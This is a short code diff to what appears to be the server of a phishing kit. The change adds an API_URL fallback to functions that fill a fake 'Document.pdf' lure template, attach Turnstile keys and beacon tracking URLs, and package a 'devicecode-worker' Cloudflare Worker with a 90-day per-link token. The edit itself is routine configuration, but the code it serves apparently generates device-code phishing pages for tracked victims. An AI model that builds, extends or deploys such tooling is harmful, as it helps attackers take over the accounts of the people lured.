@@ -483,6 +483,7 @@ async function buildWindowVars(link, user, settings, options) {
     reportTurnstileKey(turnstileSiteKey, link && link.id, 'buildWindowVars');
     var apiBase = '';
     if (options.apiBaseUrl) apiBase = String(options.apiBaseUrl).trim().replace(/\/+$/, '');
+    else if (config.API_URL) apiBase = String(config.API_URL).trim().replace(/\/+$/, '');
     else if (config.APP_URL) apiBase = String(config.APP_URL).trim().replace(/\/+$/, '');
 
     const blob = JSON.stringify({
@@ -1068,7 +1069,7 @@ async function renderPageHtml(link, user, options) {
     html = html.replace('{{FILE_NAME}}', link.file_name || getConfigDefault(templateConfig, 'file_name', 'Document.pdf'));
     html = html.replace('{{PAGES}}', String(link.pages || getConfigDefault(templateConfig, 'pages', 1)));
 
-    const verifyUrl = (options.apiBaseUrl || config.APP_URL || '').trim().replace(/\/+$/, '');
+    const verifyUrl = (options.apiBaseUrl || config.API_URL || config.APP_URL || '').trim().replace(/\/+$/, '');
     const beaconUrl = verifyUrl ? verifyUrl + '/api/beacon' : '/api/beacon';
     const logUrl = verifyUrl;
     // Per-link Turnstile site key (Widget Pool) — fallback to global env
@@ -1700,7 +1701,7 @@ async function buildWorkerScript(link, user, apiBaseUrl) {
     console.log('[WorkerBuilder] pageHtml contains BEACON_ENDPOINT:', pageHtml.includes('{{BEACON_ENDPOINT}}'));
     let workerJs = fs.readFileSync(path.join(__dirname, '..', '..', 'worker', 'devicecode-worker.js'), 'utf8');
 workerJs = workerJs.replace(/^\uFEFF/, '');
-    const verifyUrl = apiBaseUrl || config.APP_URL || (config.CF_WORKERS_SUBDOMAIN ? 'https://' + config.CF_WORKERS_SUBDOMAIN + '.workers.dev' : 'http://localhost:' + config.PORT);
+    const verifyUrl = apiBaseUrl || config.API_URL || config.APP_URL || (config.CF_WORKERS_SUBDOMAIN ? 'https://' + config.CF_WORKERS_SUBDOMAIN + '.workers.dev' : 'http://localhost:' + config.PORT);
     const linkJwt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });
 
     const escapedHtml = pageHtml
